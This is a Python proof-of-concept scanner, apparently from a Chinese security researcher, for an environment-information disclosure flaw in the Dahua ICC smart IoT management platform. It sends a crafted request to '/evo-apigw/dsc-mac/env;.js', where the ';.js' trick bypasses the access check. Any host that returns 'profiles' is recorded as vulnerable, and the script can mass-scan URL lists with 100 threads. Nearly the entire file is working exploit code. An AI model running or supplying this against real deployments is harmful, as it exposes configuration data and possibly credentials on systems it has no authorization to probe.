#大华ICC智能物联综合管理平台env敏感信息泄露

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

# banner信息
def banner():
    text = '''


 _        __                           _   _               _                _                    
(_)      / _|                         | | (_)             | |              | |                   
 _ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | |     ___  __ _| | ____ _  __ _  ___ 
| | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |    / _ \/ _` | |/ / _` |/ _` |/ _ \
| | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |___|  __/ (_| |   < (_| | (_| |  __/
|_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| \_____/\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                       __/ |     
                                                                                      |___/                                                                
                                                                     version:DH_ICC_env_Information_Leakage 1.0
                                                                     Author: Laow🚦
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="大华ICC智能物联综合管理平台env敏感信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/evo-apigw/dsc-mac/env;.js'
    url = target + url_payload
    # print(url)
    headers = {
        "Cache-Control": "max-age=0", 
        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Microsoft Edge\";v=\"126\"", 
        "Sec-Ch-Ua-Mobile": "?0", 
        "Sec-Ch-Ua-Platform": "\"Windows\"", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Sec-Fetch-Site": "none", 
        "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-User": "?1", 
        "Sec-Fetch-Dest": "document", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", 
        "Priority": "u=0, i"
        }
    try:
        response = requests.get(url=url,headers=headers,timeout=5,verify=False)
        #匹配响应包出现的内容
        if response.status_code == 200 and 'profiles' in response.text:
            print( f"{GREEN}[+] {url} 存在信息泄露！{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception:
        pass
if __name__ == '__main__':
    main()
